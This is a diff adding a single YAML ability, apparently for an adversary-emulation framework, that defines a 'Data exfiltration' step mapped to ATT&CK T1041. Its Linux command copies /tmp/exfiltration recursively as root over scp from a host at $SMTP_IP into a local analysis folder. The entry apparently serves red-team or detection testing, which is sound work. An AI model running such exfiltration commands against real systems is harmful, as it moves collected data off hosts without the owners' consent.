@@ -1,0 +1,9 @@
+- id: 40000000-0000-0000-0000-000000000008
+  name: Data exfiltration
+  description: Data exfiltration of the information accumulated.
+  tactic: exfiltration
+  technique: { attack_id: T1041, name: "Exfiltration Over C2 Channel" }
+  repeatable: false
+  singleton: true
+  platforms:
+    linux: { sh: { command: 'scp -r root@$SMTP_IP:/tmp/exfiltration $DATA_PATH/KC4/analysis && echo "Exfiltration done"', timeout: 900, parsers: [], cleanup: "" } }
